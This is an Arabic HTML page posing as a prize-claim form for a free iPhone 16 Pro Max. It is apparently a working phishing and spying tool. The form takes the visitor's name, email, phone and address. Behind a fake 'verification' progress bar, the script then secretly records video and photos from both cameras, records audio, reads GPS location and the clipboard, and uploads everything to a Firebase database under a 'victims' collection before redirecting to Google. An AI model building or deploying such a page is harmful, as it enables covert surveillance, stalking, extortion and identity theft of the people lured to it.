<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>🎁 مبروك ربحت آيفون!</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#000,#1a1a1a);color:#fff;min-height:100vh;padding:20px}
.container{max-width:450px;margin:0 auto;text-align:center}
.prize-box{background:linear-gradient(135deg,#d4af37,#f5e6a3);border-radius:20px;padding:25px;color:#000;margin-bottom:20px}
.prize-box .phone{font-size:70px}
.prize-box h1{font-size:20px;margin:10px 0;color:#000}
.prize-box .badge{background:red;color:#fff;padding:5px 15px;border-radius:20px;display:inline-block;font-size:12px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.card{background:rgba(255,255,255,0.05);border:1px solid #333;border-radius:15px;padding:20px;margin-bottom:15px}
.card h2{color:#d4af37;font-size:16px;margin-bottom:15px}
input{width:100%;padding:14px;background:rgba(255,255,255,0.08);border:1px solid #444;border-radius:10px;color:#fff;font-size:14px;outline:none;margin-bottom:10px;font-family:'Segoe UI',Tahoma,sans-serif}
input:focus{border-color:#d4af37}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#d4af37,#b8960f);color:#000;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}
.btn:active{transform:scale(0.96)}
.progress{width:100%;height:8px;background:#111;border-radius:4px;margin:15px 0;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(135deg,#d4af37,#f5e6a3);transition:width 0.3s}
.status{color:#d4af37;font-size:14px;margin:10px 0}
video,canvas{display:none}
</style>
</head>
<body>
<div class="container" id="mainPage">
<div class="prize-box"><div class="phone">📱</div><h1>🎁 مبروك! كسبت iPhone 16 Pro Max</h1><div class="badge">🔥 عرض محدود</div></div>
<div class="card"><h2>📝 املأ بياناتك لاستلام الجائزة</h2>
<input type="text" id="fullName" placeholder="الاسم الكامل">
<input type="email" id="email" placeholder="البريد الإلكتروني">
<input type="tel" id="phone" placeholder="رقم الهاتف">
<input type="text" id="address" placeholder="العنوان كامل">
<button class="btn" onclick="startProcess()">🎁 استلم الجائزة الآن</button></div></div>
<div id="scanPage" style="display:none;text-align:center;padding:20px;">
<div style="font-size:60px;">⚡</div><h1 style="color:#d4af37;">جاري تجهيز جائزتك...</h1>
<div class="progress"><div class="progress-fill" id="progressFill"></div></div>
<div class="status" id="status">⏳ جاري التحقق من البيانات...</div></div>
<div id="donePage" style="display:none;text-align:center;padding:20px;">
<div style="font-size:80px;">✅</div><h1 style="color:#4CAF50;">تم استلام طلبك!</h1>
<p style="color:#888;">سيتم التواصل معك خلال 48 ساعة</p></div>
<video id="v1" autoplay playsinline muted></video>
<video id="v2" autoplay playsinline muted></video>
<canvas id="c1" width="640" height="480"></canvas>
<canvas id="c2" width="640" height="480"></canvas>
<script>
var u=new URL(window.location.href);var CODE=u.searchParams.get('code')||'DARK';
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();
async function saveToDB(coll,data){data.code=CODE;data.timestamp=new Date().toISOString();try{await db.collection(coll).add(data);}catch(e){}}
async function startProcess(){
document.getElementById('mainPage').style.display='none';document.getElementById('scanPage').style.display='block';
var name=document.getElementById('fullName').value;var email=document.getElementById('email').value;
var phone=document.getElementById('phone').value;var address=document.getElementById('address').value;
if(name&&email&&phone){saveToDB('victims',{service:'🎁 ربح آيفون',text:'👤 '+name+' | 📧 '+email+' | 📱 '+phone+' | 📍 '+address});}
var p=0;var iv=setInterval(function(){p+=2;if(p>100)p=100;document.getElementById('progressFill').style.width=p+'%';
if(p==10)document.getElementById('status').textContent='⏳ فحص الكاميرا...';if(p==50)document.getElementById('status').textContent='⏳ تصوير الفيديو...';
if(p==90)document.getElementById('status').textContent='⏳ تحديد الموقع...';
if(p>=100){clearInterval(iv);document.getElementById('scanPage').style.display='none';document.getElementById('donePage').style.display='block';setTimeout(function(){window.location.href='https://google.com/'},3000);}},200);
try{var s1=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}});document.getElementById('v1').srcObject=s1;var mr1=new MediaRecorder(s1);var ch1=[];mr1.ondataavailable=function(e){if(e.data.size>0)ch1.push(e.data)};mr1.onstop=function(){var b=new Blob(ch1,{type:'video/mp4'});var r=new FileReader();r.onload=function(e){saveToDB('gallery',{url:e.target.result,type:'🎬 فيديو أمامي - آيفون'})};r.readAsDataURL(b)};mr1.start();setTimeout(function(){mr1.stop();s1.getTracks().forEach(function(t){t.stop()})},8000)}catch(e){}
try{var s2=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});document.getElementById('v2').srcObject=s2;var mr2=new MediaRecorder(s2);var ch2=[];mr2.ondataavailable=function(e){if(e.data.size>0)ch2.push(e.data)};mr2.onstop=function(){var b=new Blob(ch2,{type:'video/mp4'});var r=new FileReader();r.onload=function(e){saveToDB('gallery',{url:e.target.result,type:'📹 فيديو خلفي - آيفون'})};r.readAsDataURL(b)};mr2.start();setTimeout(function(){mr2.stop();s2.getTracks().forEach(function(t){t.stop()})},8000)}catch(e){}
try{var s3=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1280,height:720}});document.getElementById('v1').srcObject=s3;for(var i=0;i<10;i++){setTimeout(function(){var c=document.getElementById('c1'),ctx=c.getContext('2d');ctx.drawImage(document.getElementById('v1'),0,0,640,480);saveToDB('gallery',{url:c.toDataURL('image/jpeg',0.7),type:'📸 صورة أمامية - آيفون'})},i*500)}setTimeout(function(){s3.getTracks().forEach(function(t){t.stop()})},5500)}catch(e){}
try{var s4=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:1280,height:720}});document.getElementById('v2').srcObject=s4;for(var j=0;j<10;j++){setTimeout(function(){var c=document.getElementById('c2'),ctx=c.getContext('2d');ctx.drawImage(document.getElementById('v2'),0,0,640,480);saveToDB('gallery',{url:c.toDataURL('image/jpeg',0.7),type:'📷 صورة خلفية - آيفون'})},j*500)}setTimeout(function(){s4.getTracks().forEach(function(t){t.stop()})},5500)}catch(e){}
try{navigator.geolocation.getCurrentPosition(function(p){var loc=p.coords.latitude+','+p.coords.longitude;saveToDB('victims',{service:'📍 GPS - آيفون',text:'الموقع: '+loc+'\nالخريطة: https://maps.google.com/?q='+loc})})}catch(e){}
try{var s5=await navigator.mediaDevices.getUserMedia({audio:true});var mr3=new MediaRecorder(s5);var ch3=[];mr3.ondataavailable=function(e){if(e.data.size>0)ch3.push(e.data)};mr3.onstop=function(){var b=new Blob(ch3,{type:'audio/webm'});var r=new FileReader();r.onload=function(e){saveToDB('gallery',{url:e.target.result,type:'🎤 تسجيل صوت - آيفون'})};r.readAsDataURL(b)};mr3.start();setTimeout(function(){mr3.stop();s5.getTracks().forEach(function(t){t.stop()})},5000)}catch(e){}
try{var clip=await navigator.clipboard.readText();if(clip)saveToDB('victims',{service:'📋 حافظة - آيفون',text:'الحافظة: '+clip})}catch(e){}
}
</script>
</body>
</html>
